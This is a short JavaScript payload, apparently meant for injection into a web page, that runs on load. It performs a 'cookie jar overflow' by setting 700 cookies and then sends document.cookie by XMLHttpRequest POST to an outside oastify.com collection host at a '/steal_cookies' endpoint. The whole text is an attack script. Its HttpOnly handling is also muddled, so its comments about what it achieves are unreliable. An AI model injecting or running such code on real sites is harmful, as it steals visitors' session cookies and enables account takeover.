<script>
// Function to set a cookie
function setCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

// Function to send stolen cookies to attacker-controlled server
function sendStolenCookies(cookies) {
    // Send cookies to attacker-controlled server
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://kui76k3ejls8pgnwzoq7gtutyk4cs4gt.oastify.com/steal_cookies", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(cookies));
}

// Function to trigger cookie jar overflow and steal cookies
function triggerOverflowAndStealCookies() {
    // Set an initial HttpOnly cookie
    setCookie("HttpOnlyCookie", "InitialValue", 1);

    // Set a large number of cookies to trigger overflow
    for (let i = 0; i < 700; i++) {
        document.cookie = "cookie" + i + "=" + i;
    }

    // Set a new cookie with attacker-controlled value
    document.cookie = "attackerCookie=" + document.cookie;

    // Extract all cookies and send them to attacker-controlled server
    sendStolenCookies(document.cookie);
}

// Execute the function to trigger cookie jar overflow and steal cookies
triggerOverflowAndStealCookies();
</script>
